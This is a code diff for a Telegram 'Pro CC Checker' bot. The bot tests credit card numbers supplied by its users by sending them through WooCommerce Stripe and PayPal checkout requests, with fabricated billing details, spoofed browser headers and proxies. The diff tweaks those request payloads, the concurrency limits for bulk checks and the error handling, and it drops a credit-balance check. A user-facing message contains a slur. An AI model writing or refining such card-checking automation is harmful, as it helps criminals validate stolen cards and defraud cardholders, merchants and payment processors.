@@ -413,7 +413,7 @@ async def check_card_async(cc_line, proxies=None, user_info=None):
             }
             
             params = {'wc-ajax': 'update_order_review'}
-            data = f'security={sec}&payment_method=stripe&country=US&state=NY&postcode=10080&city=New+York&address=New+York&address_2=&s_country=US&s_state=NY&s_postcode=10080&s_city=New+York&s_address=New+York&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry=https%253A%252F%252F{encoded_site}%252F%26wc_order_attribution_session_start_time%3D2025-01-15%252016%253A33%253A26%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3D{first_name}%26billing_last_name%3D{last_name}%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D{street_address}%26billing_address_2%3D%26billing_city%3D{city}%26billing_state%3D{state}%26billing_postcode%3D{zip_code}%26billing_phone%3D{phone}%26billing_email%3D{acc}%26account_username%3D%26account_password%3D%26order_comments%3D%26g-recaptcha-response%3D%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review'
+            data = f'security={sec}&payment_method=stripe&country=US&state=NY&postcode=10080&city=New+York&address=New+York&address_2=&s_country=US&s_state=NY&s_postcode=10080&s_city=New+York&s_address=New+York&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D%28none%29&wc_order_attribution_session_entry=https%253A%252F%252F{encoded_site}%252F%26wc_order_attribution_session_start_time%3D2025-01-15%252016%253A33%253A26%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3D{first_name}%26billing_last_name%3D{last_name}%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D{street_address}%26billing_address_2%3D%26billing_city%3D{city}%26billing_state%3D{state}%26billing_postcode%3D{zip_code}%26billing_phone%3D{phone}%26billing_email%3D{acc}%26account_username%3D%26account_password%3D%26order_comments%3D%26g-recaptcha-response%3D%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review'
             
             async with session.post(site_url, params=params, headers=headers, data=data, proxy=proxy) as response:
                 await response.text()
@@ -469,7 +469,7 @@ async def check_card_async(cc_line, proxies=None, user_info=None):
                 'authority': 'www.paypal.com',
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                 'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-                'referer': 'https://www.paypal.com/smart/buttons?style.label=paypal&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_378e07784c_mtc6nde6ndk&buttonSize=large&customerId=&clientID=AY7TjJuH5RtvCuEf2ZgEVKs3quu69UggsCg29lkrb3kvsdGcX2ljKidYXXHPParmnymd9JacfRh0hzEp&clientMetadataID=uid_b5c925a7b4_mtc6nde6ndk&commit=true&components.0=buttons&components.1=funding-eligibility&currency=USD&debug=false&disableSetCookie=true&enableFunding.0=venmo&enableFunding.1=paylater&env=production&experiment.enableVenmo=true&experiment.venmoVaultWithoutPurchase=false&experiment.venmoWebEnabled=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjpmYWxzZSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpdLmF1dGhvcml0aW9uLWRhdGE9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19&sdkVersion=5.0.465&storageID=uid_ba45630ca6_mtc6nde6ndk&supportedNativeBrowser=true&supportsPopups=true&vault=false',
+                'referer': 'https://www.paypal.com/smart/buttons?style.label=paypal&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_378e07784c_mtc6nde6ndk&buttonSize=large&customerId=&clientID=AY7TjJuH5RtvCuEf2ZgEVKs3quu69UggsCg29lkrb3kvsdGcX2ljKidYXXHPParmnymd9JacfRh0hzEp&clientMetadataID=uid_b5c925a7b4_mtc6nde6ndk&commit=true&components.0=buttons&components.1=funding-eligibility&currency=USD&debug=false&disableSetCookie=true&enableFunding.0=venmo&enableFunding.1=paylater&env=production&experiment.enableVenmo=true&experiment.venmoVaultWithoutPurchase=false&experiment.venmoWebEnabled=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjpmYWxzZSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpdLmF1dGhvcml0aW9uLWRhdGE9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGE9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19',
                 'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                 'sec-ch-ua-mobile': '?1',
                 'sec-ch-ua-platform': '"Android"',
@@ -489,7 +489,7 @@ async def check_card_async(cc_line, proxies=None, user_info=None):
                 'hasShippingCallback': 'false',
                 'env': 'production',
                 'country.x': 'EG',
-                'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19',
+                'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGE9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19',
                 'disable-card': '',
                 'token': id,
             }
@@ -889,7 +889,7 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 if "Message is not modified" in str(e):
                     pass  # Ignore if message content hasn't changed
                 else:
-                    raise e
+                    raise
             except Exception as e:
                 # Handle timeout and other errors by sending a new message
                 logger.warning(f"Failed to edit message, sending new one: {str(e)}")
@@ -1059,14 +1059,6 @@ async def handle_pp_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Enhanced concurrency control with per-user semaphores
         if user_id not in user_semaphores:
             user_semaphores[user_id] = asyncio.Semaphore(max_concurrent_per_user)
-        
-        # Check if user has too many active requests
-        if not user_semaphores[user_id].locked() and user_semaphores[user_id]._value <= 0:
-            await update.message.reply_text(
-                "⚠️ Too many concurrent requests. Please wait for your current checks to complete.",
-                parse_mode="HTML"
-            )
-            return
 
         if context.user_data.get("state") != "check_cc":
             return
@@ -1171,55 +1163,6 @@ async def handle_pp_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             # Check credits BEFORE starting any processing messages
             if user_id != ADMIN_ID:
-                if db_user[3] <= 0:
-                    # Stop message rotation immediately
-                    rotation_active = False
-                    try:
-                        rotation_task.cancel()
-                    except:
-                        pass
-                    
-                    # Styled insufficient credits message with owner contact button
-                    owner_keyboard = InlineKeyboardMarkup([
-                        [InlineKeyboardButton("💬 Contact Owner", url=f"tg://user?id={ADMIN_ID}")],
-                        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back")]
-                    ])
-                    
-                    insufficient_message = f"""
-<b>💳 Insufficient Credits! 💸</b>
-━━━━━━━━━━━━━━━━
-<b>😔 Oops! You're out of credits</b>
-<b>💰 Current Balance:</b> 0 Credits
-<b>🎯 Required:</b> 1 Credit minimum
-
-<b>💡 Get more credits:</b>
-• Contact the owner below 👇
-• Purchase credit packages 💎
-• Enjoy premium checking! ⚡
-━━━━━━━━━━━━━━━━
-                    """
-                    
-                    await processing_msg.edit_text(
-                        insufficient_message, 
-                        reply_markup=owner_keyboard,
-                        parse_mode="HTML"
-                    )
-                    
-                    # Send main menu as a separate message instead of editing
-                    keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
-                    reply_markup = InlineKeyboardMarkup(keyboard)
-                    message = (
-                        "<b>ׂ╰┈➤ Welcome to ⬋</b>\n"
-                        "<b>ׂPro CC Checker 3.0</b>\n"
-                        ": ̗̀➛ Let's start Checking 💥\n"
-                        "✎ Use /pp &lt;cc|mm|yy|cvv&gt; to check Single Card\n"
-                        "✎ Use /mpp &lt;cards&gt; to check Multiple Cards\n"
-                        "╰┈➤ ex: /pp 4532123456789012|12|25|123"
-                    )
-                    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode="HTML")
-                    
-                    active_checks.discard(user_id)
-                    return
                 update_credits(user_id, db_user[3] - 1)
 
             # Get user info for check_card function
@@ -1296,6 +1239,9 @@ async def handle_pp_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         logger.error(f"Working on some Fault: {str(e)}")
         await update.message.reply_text("An error occurred. Please try again.", parse_mode="HTML")
         active_checks.discard(user_id)
+        with stats_lock:
+            if user_id in check_stats:
+                del check_stats[user_id]
 
 # Synchronous wrapper for async card checking
 def check_card(cc_line, proxies=None, user_info=None):
@@ -1520,12 +1466,16 @@ async def handle_mpp_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 'credits': (db_user[3] - len(valid_cards)) if user_id != ADMIN_ID else float('inf')
             }
 
+            # Initialize user semaphore if not exists
+            if user_id not in user_semaphores:
+                user_semaphores[user_id] = asyncio.Semaphore(max_concurrent_per_user)
+
             # Use async semaphores for better concurrency control
             async with global_semaphore:
                 async with user_semaphores[user_id]:
                     # Create async tasks for concurrent checking with higher concurrency
                     tasks = []
-                    semaphore = asyncio.Semaphore(5)  # Limit concurrent card checks
+                    semaphore = asyncio.Semaphore(3)  # Reduced concurrent card checks for stability
                     
                     async def check_card_with_semaphore(card):
                         async with semaphore:
@@ -1619,22 +1569,21 @@ async def handle_mpp_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
             except:
                 pass
             
-            logger.error(f"Multiple CC check error: {str(e)}")
-            await processing_msg.edit_text("Error: Failed to process the cards. Please try again.", parse_mode="HTML")
+            logger.error(f"Multiple CC check outer error for user {user_id}: {str(e)}")
+            try:
+                await update.message.reply_text("An error occurred. Please try again.", parse_mode="HTML")
+            except:
+                pass
+            active_checks.discard(user_id)
+            with stats_lock:
+                if user_id in check_stats:
+                    del check_stats[user_id]
         finally:
             # Clean up
             active_checks.discard(user_id)
             with stats_lock:
                 if user_id in check_stats:
                     del check_stats[user_id]
-
-    except Exception as e:
-        logger.error(f"Working on some Fault: {str(e)}")
-        await update.message.reply_text("An error occurred. Please try again.", parse_mode="HTML")
-        active_checks.discard(user_id)
-        with stats_lock:
-            if user_id in check_stats:
-                del check_stats[user_id]
 
 # Admin command to deduct credits
 async def deduct_user_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1867,6 +1816,7 @@ async def cc_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         user_id = update.effective_user.id
+        db_user = get_user(user_id)
         
         # If user is actively checking, delete their message and ignore
         if user_id in active_checks:
@@ -1876,16 +1826,25 @@ async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 pass
             return
         
-        keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        message = (
-            "<b>ׂ╰┈➤ Welcome to ⬋</b>\n"
-            "<b>ׂPro CC Checker 3.0</b>\n"
-            ": ̗̀➛ Are you retard? 🦢\n"
-            "✎ Use /pp &lt;cc|mm|yy|cvv&gt; to check Card\n"
-            "╰┈➤ ex: /pp 4532123456789012|12|25|123"
-        )
-        await update.message.reply_text(message, reply_markup=reply_markup, parse_mode="HTML")
+        # Only show the check CC message if user is registered AND in check_cc state
+        if db_user and context.user_data.get("state") == "check_cc":
+            keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            message = (
+                "<b>ׂ╰┈➤ Welcome to ⬋</b>\n"
+                "<b>ׂPro CC Checker 3.0</b>\n"
+                ": ̗̀➛ Are you retard? 🦢\n"
+                "✎ Use /pp &lt;cc|mm|yy|cvv&gt; to check Card\n"
+                "╰┈➤ ex: /pp 4532123456789012|12|25|123"
+            )
+            await update.message.reply_text(message, reply_markup=reply_markup, parse_mode="HTML")
+        elif not db_user:
+            # For unregistered users, just tell them to register
+            await update.message.reply_text("Please use /start to register first.", parse_mode="HTML")
+        else:
+            # For registered users not in check_cc state, show main menu
+            await show_main_menu(update, context)
+            
     except Exception as e:
         logger.error(f"Unknown command error: {str(e)}")
         await update.message.reply_text("An error occurred. Please use /start to begin.", parse_mode="HTML")
